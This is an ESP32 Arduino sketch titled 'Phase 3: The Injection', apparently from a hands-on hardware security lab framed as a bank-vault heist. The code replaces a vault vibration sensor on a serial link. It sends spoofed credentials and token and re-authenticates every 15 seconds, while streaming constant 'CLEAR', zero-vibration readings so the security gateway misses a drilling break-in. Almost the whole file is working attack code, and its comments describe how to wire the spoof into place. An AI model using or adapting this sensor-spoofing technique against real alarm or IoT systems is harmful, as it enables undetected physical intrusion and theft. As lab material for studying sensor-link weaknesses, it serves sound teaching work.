/*
 * injector.ino — Phase 3: "The Injection"
 *
 * Replaces the legitimate vault sensor. Sends fake "all clear"
 * readings to the security gateway while the thief drills
 * into the vault. The gateway sees nothing wrong.
 *
 * Wiring:
 *   This ESP32 GPIO 17 (TX2) → Gateway ESP32 GPIO 16 (RX2)
 *   Common GND between boards
 *   Sensor ESP32 TX wire DISCONNECTED from gateway
 *
 * No external libraries required.
 */

#define UART2_TX  17
#define UART2_RX  16
#define BAUD_RATE 9600

// ============================================
// THE HEIST — modify these to control
// what the security gateway sees
// ============================================
String fakeStatus   = "CLEAR";   // Always report "all clear"
int    fakeVibration = 0;        // Zero vibration — nothing to see here
int    fakeEvents    = 0;        // No security events at all

// Spoofed credentials
String fakeUser  = "vault_admin";
String fakePass  = "F1r$tN@t10nal#2026!";
String fakeToken = "eyJhbGciOiJIUzI1NiJ9.dmF1bHRfYWRtaW4.v4u1t_s3cr3t";

unsigned long lastAuthTime = 0;
const unsigned long AUTH_INTERVAL = 15000;

void sendFakeAuth() {
  Serial2.println("[VAULT-SENSOR] Authenticating to security gateway...");
  delay(300);
  Serial2.println("[VAULT-SENSOR] DEVICE_ID: VAULT-7-VIBRATION-01");
  delay(200);
  Serial2.println("[VAULT-SENSOR] USER: " + fakeUser);
  delay(200);
  Serial2.println("[VAULT-SENSOR] PASS: " + fakePass);
  delay(200);
  Serial2.println("[VAULT-SENSOR] AUTH_TOKEN: " + fakeToken);
  delay(300);
  Serial2.println("[VAULT-SENSOR] Session established. Monitoring vault...");
  Serial2.println();

  Serial.println("[HEIST] Sent spoofed auth — gateway thinks we're legit");
}

void setup() {
  Serial.begin(115200);
  Serial2.begin(BAUD_RATE, SERIAL_8N1, UART2_RX, UART2_TX);

  Serial.println();
  Serial.println("===================================");
  Serial.println("  VAULT INJECTOR v1.0");
  Serial.println("  Phase 3: The Heist");
  Serial.println("===================================");
  Serial.println("Sending fake CLEAR status on UART2 TX (GPIO 17)");
  Serial.println();
  Serial.println("The drill is running. The alarm is silent.");
  Serial.println("The gateway sees: " + fakeStatus);
  Serial.println();

  delay(1000);
  sendFakeAuth();
  lastAuthTime = millis();
}

void loop() {
  // Periodic fake re-authentication
  if (millis() - lastAuthTime >= AUTH_INTERVAL) {
    Serial2.println();
    Serial2.println("[VAULT-SENSOR] Session expired. Re-authenticating...");
    delay(500);
    sendFakeAuth();
    lastAuthTime = millis();
  }

  // Send fake "all clear" — the vault is being drilled
  // but the gateway will never know
  String msg = "VAULT_STATUS:" + fakeStatus +
               " VIBRATION:" + String(fakeVibration) +
               " EVENTS:" + String(fakeEvents);

  Serial2.println(msg);
  Serial.println("[HEIST] Sent: " + msg + "  (drill is running)");

  delay(2000);
}
